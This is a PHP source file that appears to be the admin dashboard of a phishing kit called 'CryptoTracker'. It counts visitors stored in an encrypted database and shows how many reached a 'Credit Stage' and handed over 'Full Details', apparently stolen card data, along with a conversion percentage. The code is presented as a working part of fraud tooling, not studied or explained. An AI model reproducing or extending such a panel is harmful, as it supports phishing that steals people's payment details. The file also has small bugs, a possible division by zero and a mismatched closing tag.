<?php
session_start();
require_once("../inc/config.inc.php");
require_once("../system/system.inc.php");
require_once("../inc/cryptodb.inc.php");
if(!isset($_SESSION['session'])) {
  header("Location: index.php");
  exit();
}
$card_stage = 0;
$total_visitors = 0;
$visitorsdb = new CryptoDB("db/visitors.cryptodb");
$rows = $visitorsdb->getRows("visitors");
foreach($rows as $row) {
  $stage = $visitorsdb->getColumns($row, "stage");
  if($stage == "Credit Stage") {
    $card_stage++;
  } else {
    $total_visitors++;
  }
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CryptoTracker V 0.2</title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <script src="assets/master.js" charset="utf-8"></script>
  </head>
  <body>
    <div class="menu">
      <ul>
        <li class="active"><a href="dashboard.php">Dashboard</a></li>
        <li><a href="visitors.php">Visitors</a></li>
        <li><a href="settings.php">Settings</a></li>
        <?php
        if($local_log) {
        ?>
        <li><a href="log.php">Local Log</a></li>
        <?php
        }
        ?>
        <li><a href="logout.php">Logout</a></li>
      </ul>
    </div>
    <div class="body">

      <div class="info-line">
        <div class="info-box blue">
          <h1>Visitors</h1>
          <h2><?php echo $total_visitors; ?></h2>
        </div>
        <div class="info-box green">
          <h1>Frequency</h1>
          <h2><?php echo ($card_stage*100)/$total_visitors; ?>%</h2>
        </div>
        <div class="info-box purple">
          <h1>Full Details</h1>
          <h2><?php echo $card_stage; ?></h2>
        </div>
      </div>
      <div class="logo">CryptoRhythm</h2>
    </div>
  </body>
</html>
